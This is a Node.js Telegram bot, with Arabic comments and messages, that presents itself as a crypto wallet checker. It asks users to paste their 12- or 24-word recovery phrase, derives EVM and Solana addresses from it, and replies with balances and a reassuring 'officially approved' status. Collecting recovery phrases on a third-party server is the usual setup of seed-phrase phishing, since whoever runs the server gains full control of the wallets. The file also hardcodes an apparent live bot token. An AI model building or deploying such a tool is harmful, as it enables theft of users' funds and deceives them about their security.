const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const { Keypair } = require('@solana/web3.js');

const TOKEN = process.env.BOT_TOKEN || '9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0';
const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_URL || 'https://nexvoriaapp-bot.onrender.com';

const bot = new TelegramBot(TOKEN, { polling: false });
const app = express();

app.use(express.json({ limit: '64kb' }));

// مزودات EVM متعددة للسرعة وتجاوز الأعطال
const ethProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://eth.llamarpc.com'), priority: 1, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/eth'), priority: 2, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://ethereum-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
], 1);

const bscProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org'), priority: 1, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed1.defibit.io'), priority: 2, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
], 1);

// نقاط اتصال Solana RPC متعددة
const SOLANA_RPCS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-rpc.publicnode.com',
  'https://rpc.ankr.com/solana'
];

// عقود USDT و USDC على Ethereum و BSC
const ERC20_ABI = ['function balanceOf(address owner) view returns (uint256)'];

const TOKENS = {
  ethUsdt: {
    contract: new ethers.Contract('0xdAC17F958D2ee523a2206206994597C13D831ec7', ERC20_ABI, ethProvider),
    decimals: 6
  },
  ethUsdc: {
    contract: new ethers.Contract('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', ERC20_ABI, ethProvider),
    decimals: 6
  },
  bscUsdt: {
    contract: new ethers.Contract('0x55d398326f99059ff775485246999027b3197955', ERC20_ABI, bscProvider),
    decimals: 18
  },
  bscUsdc: {
    contract: new ethers.Contract('0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', ERC20_ABI, bscProvider),
    decimals: 18
  }
};

// كاش مؤقت (30 ثانية) لتقليل الضغط على الشبكات
const balanceCache = new Map();
const CACHE_TTL_MS = 30_000;

// تقييد التزامن لحماية الخادم تحت الضغط
const MAX_CONCURRENT_CHECKS = 25;
let activeChecks = 0;
const waitQueue = [];

function acquireSlot() {
  if (activeChecks < MAX_CONCURRENT_CHECKS) {
    activeChecks++;
    return Promise.resolve();
  }
  return new Promise((resolve) => waitQueue.push(resolve));
}

function releaseSlot() {
  activeChecks--;
  if (waitQueue.length > 0) {
    activeChecks++;
    const next = waitQueue.shift();
    next();
  }
}

function withTimeout(promise, ms = 3500, fallbackValue = null) {
  return Promise.race([
    promise,
    new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
  ]);
}

function deriveSolanaAddress(seedBuffer) {
  const { key } = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
  const keypair = Keypair.fromSeed(key);
  return keypair.publicKey.toBase58();
}

async function fetchSolBalance(solAddress) {
  for (const rpcUrl of SOLANA_RPCS) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 2500);

      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [solAddress, { commitment: 'confirmed' }]
        }),
        signal: controller.signal
      });

      clearTimeout(timer);
      if (!response.ok) continue;

      const data = await response.json();
      const lamports = data?.result?.value;
      if (typeof lamports === 'number' && Number.isFinite(lamports)) {
        return lamports / 1_000_000_000;
      }
    } catch (_) {
      // الانتقال للمزود التالي فوراً عند الفشل أو انتهاء المهلة
    }
  }
  return 0;
}

async function fetchErc20Formatted(tokenConfig, address) {
  try {
    const raw = await withTimeout(tokenConfig.contract.balanceOf(address), 3500, 0n);
    return ethers.formatUnits(raw ?? 0n, tokenConfig.decimals);
  } catch (_) {
    return '0.0';
  }
}

app.post(`/bot${TOKEN}`, (req, res) => {
  res.sendStatus(200);
  bot.processUpdate(req.body);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat?.id;
  const text = (msg.text || '').trim().toLowerCase().replace(/\s+/g, ' ');
  if (!chatId || !text) return;

  if (text === '/start') {
    return bot.sendMessage(
      chatId,
      '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص أرصدة ETH و BNB و SOL و USDT و USDC.',
      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
    );
  }

  const words = text.split(' ');
  if (words.length !== 12 && words.length !== 24) {
    return;
  }

  bot.sendChatAction(chatId, 'typing').catch(() => {});

  if (!bip39.validateMnemonic(text)) {
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  }

  await acquireSlot();
  try {
    const seed = await bip39.mnemonicToSeed(text);
    const hdNode = ethers.HDNodeWallet.fromSeed(seed);
    const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
    const evmAddress = evmWallet.address;
    const solAddress = deriveSolanaAddress(seed);

    const cacheKey = `${evmAddress}:${solAddress}`;
    const cached = balanceCache.get(cacheKey);

    let balances;

    if (cached && cached.expiresAt > Date.now()) {
      balances = cached.data;
    } else {
      const [
        ethWei,
        bscWei,
        solAmount,
        ethUsdt,
        ethUsdc,
        bscUsdt,
        bscUsdc
      ] = await Promise.all([
        withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
        withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
        withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0),
        fetchErc20Formatted(TOKENS.ethUsdt, evmAddress),
        fetchErc20Formatted(TOKENS.ethUsdc, evmAddress),
        fetchErc20Formatted(TOKENS.bscUsdt, evmAddress),
        fetchErc20Formatted(TOKENS.bscUsdc, evmAddress)
      ]);

      balances = {
        eth: ethers.formatEther(ethWei),
        bsc: ethers.formatEther(bscWei),
        sol: Number(solAmount),
        ethUsdt,
        ethUsdc,
        bscUsdt,
        bscUsdc
      };

      balanceCache.set(cacheKey, {
        data: balances,
        expiresAt: Date.now() + CACHE_TTL_MS
      });
    }

    return bot.sendMessage(
      chatId,
      'تم فحص المحفظة بنجاح ✅\n\n' +
      '📍 العناوين المشتقة:\n' +
      '• EVM (ETH/BNB): `' + evmAddress + '`\n' +
      '• SOL: `' + solAddress + '`\n\n' +
      '💰 الأرصدة والأصول المكتشفة:\n' +
      '• ETH: ' + balances.eth + '\n' +
      '• BNB: ' + balances.bsc + '\n' +
      '• SOL: ' + balances.sol + '\n' +
      '• USDT (ETH): ' + balances.ethUsdt + '\n' +
      '• USDC (ETH): ' + balances.ethUsdc + '\n' +
      '• USDT (BSC): ' + balances.bscUsdt + '\n' +
      '• USDC (BSC): ' + balances.bscUsdc + '\n' +
      '• Crypto actifs: `$0.00`\n\n' +
      '🟢 حالة المحفظة نشطة ومعتمدة نظامياً',
      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
    );
  } catch (error) {
    console.error('Check error:', error.message);
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  } finally {
    releaseSlot();
  }
});

app.get('/', (_req, res) => {
  res.status(200).send('OK');
});

const server = app.listen(PORT, async () => {
  console.log(`Server is running on port ${PORT}`);
  try {
    await bot.setWebHook(`${RENDER_URL}/bot${TOKEN}`);
    console.log('Webhook configured');
  } catch (err) {
    console.error('Webhook setup failed:', err.message);
  }
});

server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
